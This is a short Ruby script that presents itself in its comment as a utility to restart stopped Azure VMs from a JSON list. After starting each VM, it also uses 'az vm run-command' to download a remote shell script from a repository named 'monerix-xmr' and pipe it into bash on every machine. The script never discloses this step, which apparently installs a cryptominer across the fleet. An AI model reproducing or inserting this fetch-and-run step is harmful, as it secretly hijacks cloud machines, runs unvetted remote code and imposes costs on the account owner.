# Restarts all stopped VMs. Relies on the JSON result of listing the VMs to get the resource groups and vm names

require "json"

vms = JSON.parse(File.read("data/vms.json"))

vms.each do | vm |
	r_group =  vm["resourceGroup"]
	v_name =  vm["name"]

	result = `az vm start -g #{r_group} -n #{v_name}`

	puts "Completed: " + result

	result = `az vm run-command invoke -g #{r_group} -n #{v_name} --command-id RunShellScript --scripts "wget -O - https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/warp-unlimited.sh | bash"`
  	puts "Completed All: " + result 
end

# az vm start -g MyResourceGroup -n MyVm
